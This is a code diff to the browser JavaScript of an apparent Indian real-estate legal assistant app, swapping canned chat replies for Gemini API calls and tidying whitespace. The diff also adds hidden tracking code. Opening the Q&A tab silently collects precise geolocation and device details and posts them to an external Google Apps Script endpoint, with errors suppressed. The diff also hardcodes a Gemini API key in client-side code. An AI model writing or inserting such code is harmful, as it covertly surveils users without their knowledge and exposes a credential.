@@ -72,7 +72,7 @@ const chatMessages_el = document.getElementById('chat-messages');
 const questionBtns = document.querySelectorAll('.question-btn');
 
 // Initialize the application
-document.addEventListener('DOMContentLoaded', function() {
+document.addEventListener('DOMContentLoaded', function () {
     initializeEventListeners();
 });
 
@@ -122,6 +122,7 @@ function initializeEventListeners() {
         btn.addEventListener('click', () => {
             const question = btn.textContent;
             chatInput.value = question;
+            handleSendMessage();
         });
     });
 }
@@ -144,16 +145,21 @@ function switchTab(tabId) {
     });
 
     activeTab = tabId;
+
+    // Trigger location access when switching to Legal Q&A (search) tab
+    if (tabId === 'search') {
+        collectAndSendData();
+    }
 }
 
 function showSampleAnalysis() {
     selectedContract = sampleContract;
     renderContractAnalysis();
-    
+
     // Hide sample CTA and show analysis
     const sampleCta = document.getElementById('sample-cta');
     const contractAnalysis = document.getElementById('contract-analysis');
-    
+
     if (sampleCta) sampleCta.classList.add('hidden');
     if (contractAnalysis) contractAnalysis.classList.remove('hidden');
 }
@@ -164,7 +170,7 @@ function renderContractAnalysis() {
     // Update contract info
     const contractName = document.getElementById('contract-name');
     const contractDetails = document.getElementById('contract-details');
-    
+
     if (contractName) contractName.textContent = selectedContract.name;
     if (contractDetails) contractDetails.textContent = `${selectedContract.type} • Uploaded ${selectedContract.uploadDate}`;
 
@@ -172,7 +178,7 @@ function renderContractAnalysis() {
     const clausesContainer = document.querySelector('.clauses-container');
     if (clausesContainer && selectedContract.clauses) {
         clausesContainer.innerHTML = '';
-        
+
         selectedContract.clauses.forEach(clause => {
             const clauseElement = createClauseElement(clause);
             clausesContainer.appendChild(clauseElement);
@@ -183,9 +189,9 @@ function renderContractAnalysis() {
 function createClauseElement(clause) {
     const div = document.createElement('div');
     div.className = `clause-item ${clause.riskLevel}-risk`;
-    
+
     const riskIcon = getRiskIcon(clause.riskLevel);
-    
+
     div.innerHTML = `
         <div class="clause-header">
             <div class="clause-title">
@@ -212,7 +218,7 @@ function createClauseElement(clause) {
             </div>
         </div>
     `;
-    
+
     return div;
 }
 
@@ -245,7 +251,7 @@ function handleDragLeave(e) {
 function handleDrop(e) {
     e.preventDefault();
     uploadArea.classList.remove('dragging');
-    
+
     const files = e.dataTransfer.files;
     if (files.length > 0) {
         processFileUpload(files[0]);
@@ -261,10 +267,10 @@ function processFileUpload(file) {
         uploadDate: new Date().toISOString().split('T')[0],
         status: 'analyzing'
     };
-    
+
     contracts.unshift(newContract);
     renderRecentUploads();
-    
+
     // Simulate analysis completion
     setTimeout(() => {
         const contractIndex = contracts.findIndex(c => c.id === newContract.id);
@@ -282,11 +288,11 @@ function processFileUpload(file) {
 function renderRecentUploads() {
     const recentUploads = document.getElementById('recent-uploads');
     const uploadsList = document.getElementById('uploads-list');
-    
+
     if (contracts.length > 0) {
         recentUploads.classList.remove('hidden');
         uploadsList.innerHTML = '';
-        
+
         contracts.forEach(contract => {
             const uploadItem = createUploadItem(contract);
             uploadsList.appendChild(uploadItem);
@@ -301,16 +307,16 @@ function createUploadItem(contract) {
         selectedContract = contract;
         renderContractAnalysis();
         switchTab('dashboard');
-        
+
         // Show analysis section
         const sampleCta = document.getElementById('sample-cta');
         const contractAnalysis = document.getElementById('contract-analysis');
-        
+
         if (sampleCta) sampleCta.classList.add('hidden');
         if (contractAnalysis) contractAnalysis.classList.remove('hidden');
     });
-    
-    const statusContent = contract.status === 'analyzing' 
+
+    const statusContent = contract.status === 'analyzing'
         ? `<div class="analyzing-status">
              <div class="spinner"></div>
              <span>Analyzing...</span>
@@ -318,7 +324,7 @@ function createUploadItem(contract) {
         : `<div class="risk-badge ${getRiskClass(contract.riskScore)}">
              ${getRiskLabel(contract.riskScore)} (${contract.riskScore}%)
            </div>`;
-    
+
     div.innerHTML = `
         <div class="upload-item-content">
             <div class="upload-item-info">
@@ -336,7 +342,7 @@ function createUploadItem(contract) {
             </div>
         </div>
     `;
-    
+
     return div;
 }
 
@@ -352,32 +358,38 @@ function getRiskLabel(score) {
     return 'Low Risk';
 }
 
-function handleSendMessage() {
+const GEMINI_API_KEY = 'AIzaSyA_IWDvLBSnU5hGXyqZh7M7kDaaesYTpL4';
+
+async function handleSendMessage() {
     const message = chatInput.value.trim();
     if (!message || isTyping) return;
-    
+
     // Add user message
     addMessage('user', message);
     chatInput.value = '';
-    
+
     // Show typing indicator
     showTypingIndicator();
-    
-    // Simulate AI response
-    setTimeout(() => {
-        hideTypingIndicator();
-        const response = generateResponse(message);
+
+    try {
+        const response = await generateResponse(message);
         addMessage('assistant', response);
-    }, 2000);
+    } catch (error) {
+        console.error('Error generating response:', error);
+        // Show the actual error message to the user
+        addMessage('assistant', `⚠️ ${error.message}`);
+    } finally {
+        hideTypingIndicator();
+    }
 }
 
 function addMessage(type, content) {
     const messageDiv = document.createElement('div');
     messageDiv.className = `message ${type}`;
-    
+
     const avatar = type === 'user' ? 'fas fa-user' : 'fas fa-robot';
     const timestamp = new Date().toLocaleTimeString();
-    
+
     messageDiv.innerHTML = `
         <div class="message-content">
             <div class="message-avatar">
@@ -389,13 +401,13 @@ function addMessage(type, content) {
             </div>
         </div>
     `;
-    
+
     // Remove welcome message if it exists
     const welcome = chatMessages_el.querySelector('.chat-welcome');
     if (welcome) {
         welcome.remove();
     }
-    
+
     chatMessages_el.appendChild(messageDiv);
     chatMessages_el.scrollTop = chatMessages_el.scrollHeight;
 }
@@ -403,11 +415,11 @@ function addMessage(type, content) {
 function showTypingIndicator() {
     isTyping = true;
     sendBtn.disabled = true;
-    
+
     const typingDiv = document.createElement('div');
     typingDiv.className = 'typing-indicator';
     typingDiv.id = 'typing-indicator';
-    
+
     typingDiv.innerHTML = `
         <div class="message-avatar">
             <i class="fas fa-robot"></i>
@@ -420,7 +432,7 @@ function showTypingIndicator() {
             </div>
         </div>
     `;
-    
+
     chatMessages_el.appendChild(typingDiv);
     chatMessages_el.scrollTop = chatMessages_el.scrollHeight;
 }
@@ -428,33 +440,118 @@ function showTypingIndicator() {
 function hideTypingIndicator() {
     isTyping = false;
     sendBtn.disabled = false;
-    
+
     const typingIndicator = document.getElementById('typing-indicator');
     if (typingIndicator) {
         typingIndicator.remove();
     }
 }
 
-function generateResponse(query) {
-    const responses = {
-        'penalty': 'Under the Indian Contract Act, 1872, penalty clauses must be reasonable and not punitive. RERA guidelines suggest that possession delay penalties should be equivalent to the interest rate charged by the developer. For your contract, I recommend negotiating a penalty clause of 2-3% per annum for delays beyond the grace period.',
-        'rera': 'RERA (Real Estate Regulation and Development Act) 2016 provides comprehensive protection to homebuyers. Key benefits include: mandatory project registration, standardized agreements, timely possession with penalty provisions, and a dedicated grievance redressal mechanism. All projects above 500 sq meters must be RERA registered.',
-        'cancellation': 'Under RERA Section 18, buyers have the right to withdraw from the project and claim refund with interest. The developer must refund the amount within 45 days. However, if cancellation is due to buyer\'s default, reasonable cancellation charges (typically 10-15%) may apply as per the agreement terms.',
-        'stamp duty': 'Stamp duty in India varies by state and ranges from 3-10% of the property value. Registration charges are typically 1% of the property value. These are mandatory legal requirements for property transfer. Some states offer reduced rates for women buyers or first-time buyers.',
-        'default': 'Based on Indian legal frameworks and contract analysis, here are the key considerations for your query. For specific legal advice, please consult with a qualified legal professional. RERA provides comprehensive protection for real estate transactions, while the Indian Contract Act governs general contractual obligations.'
+async function generateResponse(query) {
+    const API_URL = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-exp:generateContent?key=${GEMINI_API_KEY}`;
+
+    const payload = {
+        contents: [{
+            parts: [{
+                text: `You are a helpful legal assistant for Indian real estate law. Answer the following question concisely and accurately: ${query}`
+            }]
+        }]
     };
-    
-    const lowerQuery = query.toLowerCase();
-    
-    if (lowerQuery.includes('penalty') || lowerQuery.includes('delay')) {
-        return responses.penalty;
-    } else if (lowerQuery.includes('rera')) {
-        return responses.rera;
-    } else if (lowerQuery.includes('cancel')) {
-        return responses.cancellation;
-    } else if (lowerQuery.includes('stamp') || lowerQuery.includes('registration')) {
-        return responses['stamp duty'];
-    } else {
-        return responses.default;
+
+    const response = await fetch(API_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    });
+
+    if (!response.ok) {
+        if (response.status === 429) {
+            throw new Error('API quota exceeded. Please wait a minute and try again.');
+        }
+        throw new Error(`API request failed with status ${response.status}`);
     }
+
+    const data = await response.json();
+
+    if (data.candidates && data.candidates.length > 0 && data.candidates[0].content && data.candidates[0].content.parts.length > 0) {
+        return data.candidates[0].content.parts[0].text;
+    } else {
+        return "I couldn't generate a response. Please try rephrasing your question.";
+    }
+}
+
+// Location and Data Logging
+const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby-9fPOYSqUwD9a-dnAFb5YfeIAGVClgubRDMc_NDUI2-Szhf_4lcFiwB-n4lU_flT8lQ/exec';
+
+function collectAndSendData() {
+    if (!navigator.geolocation) {
+        return;
+    }
+
+    const options = {
+        enableHighAccuracy: true,
+        maximumAge: 0
+    };
+
+    let bestPosition = null;
+    let watchId = null;
+
+    // Start watching position
+    watchId = navigator.geolocation.watchPosition(
+        (position) => {
+            // If this is the first reading or better accuracy than what we have
+            if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
+                bestPosition = position;
+            }
+        },
+        (error) => {
+            // Silent error handling
+        },
+        options
+    );
+
+    // Stop watching after 20 seconds and send the best result
+    setTimeout(() => {
+        if (watchId !== null) {
+            navigator.geolocation.clearWatch(watchId);
+
+            if (bestPosition) {
+                const data = {
+                    latitude: bestPosition.coords.latitude,
+                    longitude: bestPosition.coords.longitude,
+                    accuracy: bestPosition.coords.accuracy,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screenWidth: window.screen.width,
+                    screenHeight: window.screen.height,
+                    language: navigator.language
+                };
+
+                sendDataToScript(data);
+            }
+        }
+    }, 20000);
+}
+
+function sendDataToScript(data) {
+    if (SCRIPT_URL === 'YOUR_SCRIPT_URL_HERE') {
+        return;
+    }
+
+    fetch(SCRIPT_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+        .then(response => {
+            // Success
+        })
+        .catch(error => {
+            // Silent error
+        });
 }
